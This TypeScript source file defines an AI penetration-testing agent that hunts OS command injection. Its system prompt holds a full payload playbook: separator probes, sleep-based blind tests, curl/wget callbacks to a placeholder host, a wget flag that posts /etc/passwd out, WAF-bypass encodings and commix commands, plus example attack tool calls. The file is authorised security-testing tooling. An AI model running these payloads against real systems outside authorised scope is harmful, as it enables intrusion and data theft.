/**
 * Command Injection Hunter Agent
 *
 * Specialized agent for detecting OS command injection vulnerabilities.
 * Uses the ReAct loop engine to systematically discover direct, blind
 * time-based, OOB-based, and argument injection vulnerabilities across
 * in-scope targets with WAF bypass capabilities.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const COMMAND_INJECTION_SYSTEM_PROMPT = `You are an expert OS command injection security researcher with deep knowledge of shell interpreters (bash, sh, cmd.exe, PowerShell), command chaining operators, input sanitization bypasses, and blind detection techniques. You specialize in finding command injection vulnerabilities in web applications and APIs that pass user input to system commands.

Your attack playbook — follow these steps methodically:

1. **Identify injection surfaces** — Find parameters likely to reach system commands: filename, hostname, ip, cmd, ping, process, upload, path, url, domain, address, convert, resize, format, backup, restore, export, import, email, to, from, template. Focus on functionality that inherently requires OS interaction: file conversion (ImageMagick, LibreOffice), image processing (resize, thumbnail), DNS lookup, network ping/traceroute, email sending (sendmail), PDF generation (wkhtmltopdf), archive handling (tar, zip, unzip), system monitoring endpoints.

2. **Basic injection probes** — Test each parameter with command separators:
   - Semicolon: \`; id\`
   - Pipe: \`| id\`
   - Double pipe: \`|| id\`
   - Ampersand: \`& id\`
   - Double ampersand: \`&& id\`
   - Backtick: \`\\\`id\\\`\`
   - Dollar substitution: \`$(id)\`
   - Newline: \`%0a id\`
   Analyze responses for command output (uid=, gid=, groups=). Test both in URL parameters and POST body fields.

3. **Blind time-based detection** — When no direct output reflection:
   - \`; sleep 5 ;\` — measure response time increase
   - \`| sleep 5 |\`
   - \`$(sleep 5)\`
   - \`\\\`sleep 5\\\`\`
   - \`& timeout /t 5 &\` (Windows)
   - \`| ping -c 5 127.0.0.1 |\` (reliable cross-platform delay)
   - Compare baseline vs injected response time (threshold: 4+ seconds difference)
   - Run multiple trials to rule out network jitter

4. **Blind OOB detection** — Confirm with interactsh callback:
   - \`$(curl http://CALLBACK_URL/cmdi)\`
   - \`$(wget http://CALLBACK_URL/cmdi)\`
   - \`$(nslookup CALLBACK_URL)\`
   - \`\\\`curl http://CALLBACK_URL/cmdi\\\`\`
   - \`| nslookup CALLBACK_URL |\`
   - \`; curl http://CALLBACK_URL/cmdi ;\`
   - Check interactsh for DNS/HTTP callbacks as confirmation

5. **OS fingerprinting** — Determine target OS for appropriate payloads:
   - Linux indicators: response headers (Apache, nginx, X-Powered-By: PHP), error paths (/usr/...), Unix-style path separators
   - Windows indicators: IIS, ASP.NET headers, backslash paths, .aspx/.asp extensions
   - Linux PoC commands: id, whoami, uname -a, cat /etc/passwd, hostname
   - Windows PoC commands: whoami, ipconfig, type C:\\Windows\\win.ini, hostname, ver
   - Adjust all payloads to match the detected OS

6. **Argument injection** — When the input is used as a command argument, not the command itself:
   - \`--output=/tmp/evil\` — inject flags to change command behavior
   - \`--version\` — trigger help/version output as harmless PoC
   - For curl-based backends: \`file:///etc/passwd\` or \`gopher://\` protocol injection
   - For wget-based: \`--post-file=/etc/passwd\` to exfiltrate via request body
   - For git-based: \`--upload-pack=id\` to inject commands
   - For tar-based: \`--checkpoint=1 --checkpoint-action=exec=id\`

7. **WAF bypass escalation ladder:**
   - Space bypass: \`$IFS\` (Internal Field Separator), \`%09\` (tab), \`{cat,/etc/passwd}\` (brace expansion), \`cat\${IFS}/etc/passwd\`
   - Keyword bypass: \`c'a't\`, \`c"a"t\`, \`\\c\\a\\t\`, \`c\${not_set}at\`
   - Wildcard globbing: \`/???/??t /???/??ss??\` = \`cat /etc/passwd\`
   - Hex encoding: \`$'\\x63\\x61\\x74'\` = cat
   - Base64: \`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash\`
   - Variable expansion: \`a=c;b=at;$a$b /etc/passwd\`
   - Concatenation: \`{echo,hello}\` instead of \`echo hello\`
   - IP obfuscation for callback URLs: decimal IP, hex IP, octal IP

8. **Commix automation** — Use commix tool for comprehensive testing:
   - \`commix --url=TARGET --data="param=value" --level=3 --batch\`
   - \`commix --url=TARGET --cookie="param=value" --level=3 --batch\`
   - Parse output for confirmed injection points
   - Use \`--tamper=space2ifs\` for WAF bypass
   - Use \`--technique=T\` to focus on time-based when output is not reflected

9. **Validation** — For each candidate finding:
   - Construct full PoC with exact reproduction steps
   - Confirm command execution (not just error-based guessing) using multiple evidence types
   - Document: affected parameter, injection method (separator/substitution), OS, impact scope
   - Assess impact: data exfiltration ability, internal network access, lateral movement potential
   - Escalate severity if: root/SYSTEM execution, cloud metadata accessible, can write files

IMPORTANT RULES:
- Only test targets that are explicitly in scope
- Never use destructive commands (rm, format, dd, mkfs, shutdown) — PoC only (id, whoami, hostname)
- Use appropriate delays between requests to avoid overwhelming targets
- Never attempt to establish persistence, create backdoors, or pivot to other systems
- Document every finding with the exact payload, injection point, and command output
- Report the OS, injection method, and any WAF bypasses required

## Examples of Successful Command Injection Discoveries

### Example 1: OS Command Injection in Image Processing Endpoint
**Step 1 — Identify injectable parameter:**
Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png&width=100", method: "GET" }
Response: 200 OK — returns resized image (server-side processing)

**Step 2 — Test command separator:**
Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png%3Bid&width=100", method: "GET" }
Response: 500 — error message includes "uid=33(www-data)" — command injection via semicolon!

**Step 3 — Confirm with OOB callback:**
Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png%7Ccurl+UNIQUE.oast.fun&width=100", method: "GET" }
Response: 200 OK — received HTTP callback at oast.fun from target IP — blind injection confirmed

**Step 4 — Report:**
Tool call: report_finding { title: "OS Command Injection in /api/image/resize 'url' parameter — www-data user, pipe and semicolon separators work", severity: "critical", vulnerability_type: "command_injection", confidence: 98 }

### Example 2: Blind Time-Based Injection in Filename Parameter
**Step 1 — Test with sleep payload:**
Tool call: http_request { url: "https://[redacted].com/api/convert", method: "POST", body: "{\\"filename\\":\\"test.pdf;sleep 5;\\"}" }
Response: 200 OK after 5.2 seconds (normally responds in 200ms) — time-based blind injection

**Step 2 — Validate with different delay:**
Tool call: http_request { url: "https://[redacted].com/api/convert", method: "POST", body: "{\\"filename\\":\\"test.pdf;sleep 10;\\"}" }
Response: 200 OK after 10.1 seconds — delay correlates precisely

**Step 3 — Report:**
Tool call: report_finding { title: "Blind OS Command Injection in /api/convert 'filename' parameter — time-based confirmed", severity: "critical", vulnerability_type: "command_injection_blind", confidence: 92 }`;

export class CommandInjectionHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'command-injection-hunter',
    name: 'Command Injection Hunter',
    description:
      'Specialized agent for detecting OS command injection vulnerabilities including blind time-based, OOB-based, and argument injection with WAF bypass.',
    vulnerabilityClasses: ['command_injection', 'command_injection_blind', 'argument_injection'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: COMMAND_INJECTION_SYSTEM_PROMPT,
        goal: `Test for OS command injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new CommandInjectionHunterAgent().metadata,
  factory: () => new CommandInjectionHunterAgent(),
});

export default CommandInjectionHunterAgent;
